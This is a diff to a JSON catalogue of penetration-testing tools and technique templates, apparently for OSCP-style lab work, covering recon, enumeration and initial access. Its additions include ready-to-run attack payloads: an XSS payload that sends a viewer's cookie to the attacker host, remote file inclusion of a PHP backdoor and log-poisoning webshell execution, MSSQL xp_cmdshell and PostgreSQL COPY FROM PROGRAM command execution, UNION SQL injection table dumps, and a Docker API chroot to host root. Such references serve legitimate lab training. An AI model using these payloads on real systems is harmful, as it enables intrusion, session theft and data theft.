@@ -7,7 +7,8 @@
       { "purpose": "Versions and default scripts on the ports you found", "template": "nmap -sC -sV -p <ports> -oA nmap/services {{TARGET}}", "intent": "enumerate" },
       { "purpose": "Run the vuln script category against found ports", "template": "nmap --script vuln -p <ports> -oA nmap/vuln {{TARGET}}", "intent": "enumerate" },
       { "purpose": "Skip host discovery when ping is blocked (Windows boxes)", "template": "nmap -Pn -sC -sV {{TARGET}}", "intent": "tune" },
-      { "purpose": "Pull the open ports out of a greppable scan as a comma list", "template": "grep -oP '\\d+/open' nmap/full.gnmap | cut -d/ -f1 | paste -sd,", "intent": "tune" }
+      { "purpose": "Pull the open ports out of a greppable scan as a comma list", "template": "grep -oP '\\d+/open' nmap/full.gnmap | cut -d/ -f1 | paste -sd,", "intent": "tune" },
+      { "purpose": "Ping sweep a subnet for live hosts", "template": "nmap -sn <subnet>", "intent": "discover" }
     ]},
     { "name": "autorecon", "description": "Multi-threaded recon that runs nmap, then service-specific tools on every port it finds.", "commands": [
       { "purpose": "Full automated recon; results land in ./results/{{TARGET}}", "template": "sudo autorecon {{TARGET}}", "intent": "discover" },
@@ -179,9 +180,68 @@
       { "purpose": "Decode a token and list its claims", "template": "python3 jwt_tool.py '<token>'", "intent": "enumerate" },
       { "purpose": "Try the alg=none signature bypass", "template": "python3 jwt_tool.py '<token>' -X a", "intent": "exploit" },
       { "purpose": "Edit claims and re-sign with a cracked HS256 secret", "template": "python3 jwt_tool.py '<token>' -T -S hs256 -p '<secret>'", "intent": "exploit" }
-    ] }
+    ] },
+    { "name": "fping", "description": "Fast ICMP sweeper for finding live hosts on a subnet.", "commands": [
+      { "purpose": "List the live hosts on a subnet, quietly", "template": "fping -asgq <subnet>", "intent": "discover" }
+    ]},
+    { "name": "smtp-user-enum", "description": "Guesses valid mail users with VRFY, EXPN or RCPT TO.", "commands": [
+      { "purpose": "Check usernames with VRFY", "template": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {{TARGET}}", "intent": "enumerate" },
+      { "purpose": "RCPT TO mode when VRFY is disabled", "template": "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -D <domain> -t {{TARGET}}", "intent": "enumerate" }
+    ]},
+    { "name": "dnsrecon", "description": "DNS enumeration: zone transfers, reverse sweeps and subdomain brute force.", "commands": [
+      { "purpose": "Reverse-lookup a range against the target DNS server", "template": "dnsrecon -r <cidr> -n {{TARGET}}", "intent": "enumerate" },
+      { "purpose": "Brute-force subdomains against the target DNS server", "template": "dnsrecon -d {{DNS}} -n {{TARGET}} -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "intent": "discover" }
+    ]},
+    { "name": "snmp-check", "description": "Prints SNMP data as a readable report: users, processes, software, ports.", "commands": [
+      { "purpose": "Readable dump with the public community", "template": "snmp-check {{TARGET}} -c public", "intent": "enumerate" }
+    ]},
+    { "name": "git-dumper", "description": "Downloads an exposed .git folder and rebuilds the repository.", "commands": [
+      { "purpose": "Rebuild the repo, then read git log and old commits", "template": "git-dumper http://{{DNS}}/.git/ ./repo", "intent": "dump" }
+    ]},
+    { "name": "ftp", "description": "Plain FTP client (try anonymous:anonymous; binary before get).", "commands": [
+      { "purpose": "Log in (anonymous with any password often works)", "template": "ftp {{TARGET}}", "intent": "authenticate" }
+    ]},
+    { "name": "tcpdump", "description": "Packet capture on your interface: proves blind callbacks (ping, DNS).", "commands": [
+      { "purpose": "Watch for pings from the target to prove blind execution", "template": "sudo tcpdump -ni tun0 icmp", "intent": "discover" }
+    ]},
+    { "name": "exiftool", "description": "Reads document and image metadata; authors are often domain usernames.", "commands": [
+      { "purpose": "Read every metadata field of a file", "template": "exiftool -a -u <file>", "intent": "enumerate" },
+      { "purpose": "Collect author names from downloaded PDFs for a username list", "template": "exiftool -Author -Creator -s3 *.pdf | sort -u", "intent": "enumerate" }
+    ]},
+    { "name": "psql", "description": "PostgreSQL client.", "commands": [
+      { "purpose": "Log in as postgres (try no password, then postgres)", "template": "psql -h {{TARGET}} -U postgres", "intent": "authenticate" }
+    ]},
+    { "name": "mongosh", "description": "MongoDB shell.", "commands": [
+      { "purpose": "Connect without auth (show dbs, use <db>, db.<collection>.find())", "template": "mongosh mongodb://{{TARGET}}:27017", "intent": "authenticate" }
+    ]},
+    { "name": "vncviewer", "description": "VNC client (TigerVNC).", "commands": [
+      { "purpose": "Connect; it asks for the password if one is set", "template": "vncviewer {{TARGET}}::5900", "intent": "authenticate" }
+    ]},
+    { "name": "tftp", "description": "TFTP client: get and put files by exact name.", "commands": [
+      { "purpose": "Pull one file by name", "template": "tftp {{TARGET}} -c get <file>", "intent": "dump" }
+    ]},
+    { "name": "rsync", "description": "File sync over the rsync protocol; lists and copies modules.", "commands": [
+      { "purpose": "List the modules", "template": "rsync -av --list-only rsync://{{TARGET}}/", "intent": "enumerate" },
+      { "purpose": "Copy a module to Kali", "template": "rsync -av rsync://{{TARGET}}/<share> ./rsync", "intent": "dump" }
+    ]},
+    { "name": "finger-user-enum", "description": "Checks a username list against the finger service (pentestmonkey).", "commands": [
+      { "purpose": "Find valid usernames", "template": "finger-user-enum -U /usr/share/seclists/Usernames/Names/names.txt -t {{TARGET}}", "intent": "enumerate" }
+    ]},
+    { "name": "davtest", "description": "Tests which file types a WebDAV folder lets you upload and run.", "commands": [
+      { "purpose": "Try every upload type and see which execute", "template": "davtest -url http://{{DNS}}/<dir>", "intent": "enumerate" }
+    ]},
+    { "name": "cadaver", "description": "Command-line WebDAV client (put, move, delete).", "commands": [
+      { "purpose": "Open the WebDAV folder (put <file>, move to rename)", "template": "cadaver http://{{DNS}}/<dir>", "intent": "transfer" }
+    ]}
   ],
   "techniques": [
+    {
+      "name": "Find live hosts on a subnet",
+      "phase": "Recon", "service": "any", "applies": "any",
+      "needs": [], "yields": [],
+      "when": "You were given a range, not one IP (Pro Labs, OSCP AD set, a new pivot subnet): find which hosts are up before scanning ports.",
+      "tools": ["nmap", "fping"]
+    },
     {
       "name": "Automated first-pass recon",
       "phase": "Recon", "service": "any", "applies": "any",
@@ -205,10 +265,9 @@
       "phase": "Recon", "service": "ftp", "applies": "any",
       "needs": [], "yields": ["version", "creds"],
       "when": "Port 21 is open: check for anonymous login and files you can read or upload.",
-      "tools": ["hydra"],
+      "tools": ["hydra", "ftp"],
       "commands": [
         { "purpose": "Anonymous login and server type scripts", "template": "nmap -p21 --script ftp-anon,ftp-syst -sV {{TARGET}}", "intent": "enumerate" },
-        { "purpose": "Connect by hand; try user anonymous with an empty password", "template": "ftp {{TARGET}}", "intent": "authenticate" },
         { "purpose": "Mirror everything readable anonymously", "template": "wget -m --no-passive ftp://anonymous:anonymous@{{TARGET}}", "intent": "dump" }
       ]
     },
@@ -229,11 +288,10 @@
       "phase": "Recon", "service": "smtp", "applies": "any",
       "needs": [], "yields": ["version"],
       "when": "Port 25 is open: the mail server may confirm which usernames exist.",
-      "tools": [],
+      "tools": ["smtp-user-enum"],
       "commands": [
         { "purpose": "Supported commands, user enum and open relay scripts", "template": "nmap -p25 --script smtp-commands,smtp-enum-users,smtp-open-relay {{TARGET}}", "intent": "enumerate" },
-        { "purpose": "Talk to it by hand; then type VRFY root", "template": "nc -nv {{TARGET}} 25", "intent": "enumerate" },
-        { "purpose": "Check a list of usernames with VRFY", "template": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {{TARGET}}", "intent": "enumerate" }
+        { "purpose": "Talk to it by hand; then type VRFY root", "template": "nc -nv {{TARGET}} 25", "intent": "enumerate" }
       ]
     },
     {
@@ -241,11 +299,9 @@
       "phase": "Recon", "service": "dns", "applies": "any",
       "needs": [], "yields": [],
       "when": "Port 53 is open: try a zone transfer to reveal every hostname the box serves.",
-      "tools": ["dig"],
+      "tools": ["dig", "dnsrecon"],
       "commands": [
-        { "purpose": "Zone transfer with host instead of dig", "template": "host -l {{DNS}} {{TARGET}}", "intent": "enumerate" },
-        { "purpose": "Reverse lookups across the subnet using the target as resolver", "template": "dnsrecon -r <cidr> -n {{TARGET}}", "intent": "enumerate" },
-        { "purpose": "Brute-force subdomains against the target's DNS", "template": "dnsrecon -d {{DNS}} -n {{TARGET}} -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "intent": "discover" }
+        { "purpose": "Zone transfer with host instead of dig", "template": "host -l {{DNS}} {{TARGET}}", "intent": "enumerate" }
       ]
     },
     {
@@ -282,10 +338,9 @@
       "phase": "Recon", "service": "snmp", "applies": "any",
       "needs": [], "yields": ["creds"],
       "when": "UDP 161 is open: guess the community string, then walk the tree for users, processes and software.",
-      "tools": ["onesixtyone", "snmpwalk"],
+      "tools": ["onesixtyone", "snmpwalk", "snmp-check"],
       "commands": [
-        { "purpose": "Confirm SNMP and read basic info", "template": "sudo nmap -sU -p161 --script snmp-info,snmp-sysdescr {{TARGET}}", "intent": "enumerate" },
-        { "purpose": "Readable summary of everything SNMP exposes", "template": "snmp-check {{TARGET}} -c public", "intent": "enumerate" }
+        { "purpose": "Confirm SNMP and read basic info", "template": "sudo nmap -sU -p161 --script snmp-info,snmp-sysdescr {{TARGET}}", "intent": "enumerate" }
       ]
     },
     {
@@ -366,6 +421,93 @@
       ]
     },
     {
+      "name": "POP3 and IMAP mailbox access",
+      "phase": "Recon", "service": "imap", "applies": "any",
+      "needs": ["creds"], "yields": ["creds"],
+      "when": "Ports 110/143/993/995 are open and you have mail creds: read the inbox for passwords, links and usernames.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Versions and capabilities of the mail services", "template": "nmap -p110,143,993,995 -sV --script 'pop3-capabilities,imap-capabilities' {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "List the inbox over IMAPS", "template": "curl -k 'imaps://{{TARGET}}/INBOX' --user '<user>:<pass>'", "intent": "enumerate" },
+        { "purpose": "Read message 1 over IMAPS", "template": "curl -k 'imaps://{{TARGET}}/INBOX;UID=1' --user '<user>:<pass>'", "intent": "dump" },
+        { "purpose": "Read message 1 over POP3S", "template": "curl -k 'pop3s://{{TARGET}}/1' --user '<user>:<pass>'", "intent": "dump" },
+        { "purpose": "Talk IMAP by hand over TLS (a1 LOGIN <user> <pass>)", "template": "openssl s_client -connect {{TARGET}}:993 -quiet", "intent": "authenticate" }
+      ]
+    },
+    {
+      "name": "PostgreSQL access check",
+      "phase": "Recon", "service": "postgresql", "applies": "any",
+      "needs": [], "yields": ["version", "shell"],
+      "when": "Port 5432 is open: try postgres with no or a default password; a superuser can run commands.",
+      "tools": ["psql"],
+      "commands": [
+        { "purpose": "In psql: list databases (\\c <db> then \\dt for tables)", "template": "\\l", "intent": "enumerate" },
+        { "purpose": "In psql as superuser: run a command and read its output", "template": "CREATE TABLE slg(t text); COPY slg FROM PROGRAM 'id'; SELECT * FROM slg;", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "MongoDB access check",
+      "phase": "Recon", "service": "mongodb", "applies": "any",
+      "needs": [], "yields": ["version", "creds"],
+      "when": "Port 27017 is open: MongoDB often has no auth, so list databases and read the user collections.",
+      "tools": ["mongosh"],
+      "commands": [
+        { "purpose": "Version and databases via script", "template": "nmap -p27017 --script mongodb-info,mongodb-databases {{TARGET}}", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "VNC access check",
+      "phase": "Recon", "service": "vnc", "applies": "any",
+      "needs": [], "yields": [],
+      "when": "Port 5900 is open: check for no auth or an auth bypass, then try found passwords.",
+      "tools": ["vncviewer"],
+      "commands": [
+        { "purpose": "Security types and the RealVNC bypass", "template": "nmap -p5900 --script vnc-info,realvnc-auth-bypass {{TARGET}}", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "TFTP file pull",
+      "phase": "Recon", "service": "tftp", "applies": "any",
+      "needs": [], "yields": ["version", "creds"],
+      "when": "UDP 69 is open: TFTP has no auth or listing, so guess file names (configs, backups).",
+      "tools": ["tftp"],
+      "commands": [
+        { "purpose": "Guess common file names", "template": "sudo nmap -sU -p69 --script tftp-enum {{TARGET}}", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Rsync module access",
+      "phase": "Recon", "service": "rsync", "applies": "any",
+      "needs": [], "yields": ["version", "creds"],
+      "when": "Port 873 is open: list modules and pull anything readable without a password.",
+      "tools": ["rsync"],
+      "commands": [
+        { "purpose": "List modules via script", "template": "nmap -p873 --script rsync-list-modules {{TARGET}}", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Finger user enumeration",
+      "phase": "Recon", "service": "finger", "applies": "linux",
+      "needs": [], "yields": [],
+      "when": "Port 79 is open: finger shows logged-in users and confirms usernames.",
+      "tools": ["finger-user-enum"],
+      "commands": [
+        { "purpose": "Who is logged in right now", "template": "finger @{{TARGET}}", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "IPMI hash dump",
+      "phase": "Recon", "service": "ipmi", "applies": "any",
+      "needs": [], "yields": ["version", "hash"],
+      "when": "UDP 623 is open: IPMI 2.0 hands out a crackable hash for any valid user (try ADMIN, root, admin).",
+      "tools": [],
+      "commands": [
+        { "purpose": "Version and the cipher-zero auth bypass", "template": "sudo nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "In msfconsole: dump the RAKP hashes", "template": "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {{TARGET}}; run", "intent": "dump" },
+        { "purpose": "Crack IPMI RAKP hashes", "template": "hashcat -m 7300 <hashfile> /usr/share/wordlists/rockyou.txt", "intent": "tune" }
+      ]
+    },
+    {
       "name": "Unknown port identification",
       "phase": "Recon", "service": "any", "applies": "any",
       "needs": [], "yields": ["version"],
@@ -402,9 +544,8 @@
       ]
     },
     { "name": "Directory and file discovery", "phase": "Recon", "service": "http", "applies": "any", "needs": [], "yields": ["web app"], "when": "Any website: brute-force paths to find hidden pages, admin panels, backups and upload folders.", "tools": ["ffuf","gobuster","feroxbuster"] },
-    { "name": "Exposed git repository recovery", "phase": "Recon", "service": "http", "applies": "any", "needs": ["web app"], "yields": ["creds"], "when": "A /.git/ path answers on the site: download the repository and read its history for source, secrets and old passwords.", "tools": [], "commands": [
+    { "name": "Exposed git repository recovery", "phase": "Recon", "service": "http", "applies": "any", "needs": ["web app"], "yields": ["creds"], "when": "A /.git/ path answers on the site: download the repository and read its history for source, secrets and old passwords.", "tools": ["git-dumper"], "commands": [
       { "purpose": "Check for an exposed repo (a 'ref:' line means it is there)", "template": "curl -s http://{{DNS}}/.git/HEAD", "intent": "discover" },
-      { "purpose": "Download the .git folder and rebuild the source", "template": "git-dumper http://{{DNS}}/.git/ ./repo", "intent": "dump" },
       { "purpose": "Commit history: deleted secrets live in old commits", "template": "git -C repo log --oneline --all", "intent": "enumerate" },
       { "purpose": "Show one commit's changes", "template": "git -C repo show <commit>", "intent": "dump" }
     ] },
@@ -496,7 +637,11 @@
       "commands": [
         { "purpose": "Single quote probe: a SQL error or a changed page is a strong hint", "template": "curl -s \"http://{{DNS}}/<page>?id=1'\"", "intent": "discover" },
         { "purpose": "Boolean probe: compare page sizes for true vs false", "template": "curl -s 'http://{{DNS}}/<page>?id=1%20AND%201=1' | wc -c; curl -s 'http://{{DNS}}/<page>?id=1%20AND%201=2' | wc -c", "intent": "discover" },
-        { "purpose": "Login bypass probe in the username field", "template": "curl -s -X POST http://{{DNS}}/<page> -d \"username=admin'-- -&password=x\"", "intent": "exploit" }
+        { "purpose": "Login bypass probe in the username field", "template": "curl -s -X POST http://{{DNS}}/<page> -d \"username=admin'-- -&password=x\"", "intent": "exploit" },
+        { "purpose": "Count the columns: lower the number until the error goes away", "template": "curl -s \"http://{{DNS}}/<page>?id=1%20ORDER%20BY%205--%20-\"", "intent": "discover" },
+        { "purpose": "UNION with the right column count: see which numbers show on the page", "template": "curl -s \"http://{{DNS}}/<page>?id=-1%20UNION%20SELECT%201,2,3--%20-\"", "intent": "dump" },
+        { "purpose": "List the tables of the current database (MySQL)", "template": "curl -s \"http://{{DNS}}/<page>?id=-1%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-\"", "intent": "dump" },
+        { "purpose": "Field input on MSSQL with stacked queries: turn on xp_cmdshell and run a command", "template": "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell '<command>';-- -", "intent": "exploit" }
       ]
     },
     {
@@ -511,7 +656,11 @@
         { "purpose": "Windows target file", "template": "curl -s 'http://{{DNS}}/<page>?file=..\\..\\..\\..\\windows\\win.ini'", "intent": "discover" },
         { "purpose": "Read PHP source as base64 with the filter wrapper", "template": "curl -s 'http://{{DNS}}/<page>?file=php://filter/convert.base64-encode/resource=index.php' | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d", "intent": "dump" },
         { "purpose": "Fuzz many traversal payloads; filter the normal page size", "template": "ffuf -u 'http://{{DNS}}/<page>?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs <size>", "intent": "discover" },
-        { "purpose": "If the web log is readable, log poisoning may turn LFI into code execution", "template": "curl -s 'http://{{DNS}}/<page>?file=../../../../../../var/log/apache2/access.log'", "intent": "discover" }
+        { "purpose": "If the web log is readable, log poisoning may turn LFI into code execution", "template": "curl -s 'http://{{DNS}}/<page>?file=../../../../../../var/log/apache2/access.log'", "intent": "discover" },
+        { "purpose": "RFI: serve /usr/share/webshells/php/simple-backdoor.php with sudo python3 -m http.server 80 and include it", "template": "curl -s 'http://{{DNS}}/<page>?file=http://{{LHOST}}/<file>.php&cmd=id'", "intent": "exploit" },
+        { "purpose": "data:// wrapper runs PHP from the URL when allow_url_include is on", "template": "curl -s 'http://{{DNS}}/<page>?file=data://text/plain;base64,<base64-webshell>&cmd=id'", "intent": "exploit" },
+        { "purpose": "Log poisoning: put PHP in your User-Agent so it lands in access.log", "template": "curl -s -A '<webshell>' http://{{DNS}}/", "intent": "exploit" },
+        { "purpose": "Then include the log to run it", "template": "curl -s 'http://{{DNS}}/<page>?file=../../../../../../var/log/apache2/access.log&cmd=id'", "intent": "exploit" }
       ]
     },
     {
@@ -533,11 +682,10 @@
       "phase": "Initial Access", "service": "http", "applies": "any",
       "needs": ["web app"], "yields": ["shell"],
       "when": "A feature runs a system tool for you (ping, lookup, convert): check whether extra shell commands get through.",
-      "tools": ["commix"],
+      "tools": ["commix", "tcpdump"],
       "commands": [
         { "purpose": "Separator probes; output of id means it worked (try ; | && $() and %0a)", "template": "curl -s -X POST http://{{DNS}}/<page> --data-urlencode 'ip=127.0.0.1;id'", "intent": "discover" },
         { "purpose": "Blind probe: a 5 second delay means injection", "template": "time curl -s -X POST http://{{DNS}}/<page> --data-urlencode 'ip=127.0.0.1;sleep 5'", "intent": "discover" },
-        { "purpose": "Blind probe: watch for pings from the target", "template": "sudo tcpdump -ni tun0 icmp", "intent": "discover" },
         { "purpose": "Fuzz many injection payloads", "template": "ffuf -u http://{{DNS}}/<page> -X POST -d 'ip=127.0.0.1FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -fs <size>", "intent": "discover" }
       ]
     },
@@ -561,8 +709,8 @@
       "tools": [],
       "commands": [
         { "purpose": "Read a local file through an entity", "template": "curl -s -X POST http://{{DNS}}/<page> -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>'", "intent": "discover" },
-        { "purpose": "Blind check: serve files and watch for a hit from the target", "template": "python3 -m http.server {{LPORT}}", "intent": "discover" },
-        { "purpose": "Blind probe that calls back to your web server", "template": "curl -s -X POST http://{{DNS}}/<page> -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{{LHOST}}:{{LPORT}}/xxe\">]><r>&x;</r>'", "intent": "discover" }
+        { "purpose": "Blind check: serve files and watch for a hit from the target", "template": "sudo python3 -m http.server 80", "intent": "discover" },
+        { "purpose": "Blind probe that calls back to your web server", "template": "curl -s -X POST http://{{DNS}}/<page> -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{{LHOST}}/xxe\">]><r>&x;</r>'", "intent": "discover" }
       ]
     },
     {
@@ -578,7 +726,7 @@
       ]
     },
     { "name": "Server-side request forgery", "phase": "Initial Access", "service": "http", "applies": "any", "needs": ["web app"], "yields": ["web app","creds"], "when": "A feature fetches a URL you give it (link preview, import, webhook, PDF render): make the server request internal addresses for you.", "tools": ["ffuf"], "commands": [
-      { "purpose": "Confirm it calls out: run python3 -m http.server {{LPORT}} and watch for the hit", "template": "curl -s -X POST http://{{DNS}}/<page> --data-urlencode 'url=http://{{LHOST}}:{{LPORT}}/ssrf'", "intent": "discover" },
+      { "purpose": "Confirm it calls out: run sudo python3 -m http.server 80 and watch for the hit", "template": "curl -s -X POST http://{{DNS}}/<page> --data-urlencode 'url=http://{{LHOST}}/ssrf'", "intent": "discover" },
       { "purpose": "Read a service that only listens on the server itself", "template": "curl -s -X POST http://{{DNS}}/<page> --data-urlencode 'url=http://127.0.0.1:<port>/'", "intent": "enumerate" },
       { "purpose": "Make a port list for an internal scan", "template": "seq 1 65535 > ports.txt", "intent": "tune" },
       { "purpose": "Scan internal ports through it; filter the closed-port size", "template": "ffuf -u http://{{DNS}}/<page> -X POST -d 'url=http://127.0.0.1:FUZZ/' -H 'Content-Type: application/x-www-form-urlencoded' -w ports.txt -fs <size>", "intent": "discover" }
@@ -625,6 +773,39 @@
         { "purpose": "Run a command through the uploaded shell", "template": "curl -s -G http://{{DNS}}/<upload_dir>/<file> --data-urlencode 'cmd=id'", "intent": "exploit" },
         { "purpose": "See which tools exist on the target for a reverse shell", "template": "curl -s -G http://{{DNS}}/<upload_dir>/<file> --data-urlencode 'cmd=which python3 python bash nc curl wget'", "intent": "enumerate" },
         { "purpose": "Start your listener before triggering a reverse shell", "template": "nc -lvnp {{LPORT}}", "intent": "" }
+      ]
+    },
+    {
+      "name": "Upload through WebDAV",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": [], "yields": ["shell"],
+      "when": "nmap or a scanner shows WebDAV (PROPFIND, PUT allowed): upload a file type the server runs.",
+      "tools": ["davtest", "cadaver"],
+      "commands": [
+        { "purpose": "Upload one file with curl", "template": "curl -T <file> -u '<user>:<pass>' http://{{DNS}}/<dir>/<file>", "intent": "transfer" }
+      ]
+    },
+    {
+      "name": "Exposed Docker API to host root",
+      "phase": "Initial Access", "service": "docker-api", "applies": "linux",
+      "needs": [], "yields": ["shell", "admin"],
+      "when": "Port 2375 answers HTTP: the Docker API without TLS lets anyone start a container with the host disk mounted.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Confirm the API answers without auth", "template": "curl -s http://{{TARGET}}:2375/version", "intent": "enumerate" },
+        { "purpose": "List images to start from", "template": "docker -H tcp://{{TARGET}}:2375 images", "intent": "enumerate" },
+        { "purpose": "Root shell on the host disk through a container", "template": "docker -H tcp://{{TARGET}}:2375 run -v /:/mnt --rm -it <image> chroot /mnt sh", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Steal a session with stored or blind XSS",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["admin"],
+      "when": "Something you submit is shown to another user later (support ticket, comment, contact form): make their browser send you their cookie.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Serve files on port 80 and watch for the hit (the listener keeps {{LPORT}})", "template": "sudo python3 -m http.server 80", "intent": "discover" },
+        { "purpose": "Field input: the viewer's cookie arrives in your server log (no HttpOnly flag needed)", "template": "<img src=x onerror=\"this.src='http://{{LHOST}}/?c='+document.cookie\">", "intent": "exploit" }
       ]
     }
   ]
